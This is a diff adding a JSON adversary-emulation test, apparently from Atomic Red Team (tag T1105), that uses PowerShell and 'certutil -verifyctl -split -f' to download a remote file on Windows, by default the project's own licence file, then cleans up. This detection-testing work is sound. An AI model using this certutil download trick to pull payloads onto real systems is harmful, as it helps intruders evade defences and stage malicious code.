@@ -1,0 +1,58 @@
+{
+  "id": "ffd492e3-0455-4518-9fb1-46527c9f241b",
+  "name": "certutil download (verifyctl)",
+  "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "f2e63335-b944-48b6-91ae-22289f2d09b5",
+      "type": "execute-command",
+      "data": {
+        "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4311d92a-34da-4ec2-9441-3749bc777358",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "f2e63335-b944-48b6-91ae-22289f2d09b5",
+      "p": "on-success",
+      "o": "4311d92a-34da-4ec2-9441-3749bc777358"
+    },
+    {
+      "s": "f2e63335-b944-48b6-91ae-22289f2d09b5",
+      "p": "on-failure",
+      "o": "4311d92a-34da-4ec2-9441-3749bc777358"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_file",
+      "type": "url",
+      "description": "URL of file to copy",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+    },
+    {
+      "name": "local_path",
+      "type": "path",
+      "description": "Local path to place file",
+      "value": "Atomic-license.txt"
+    }
+  ]
+}
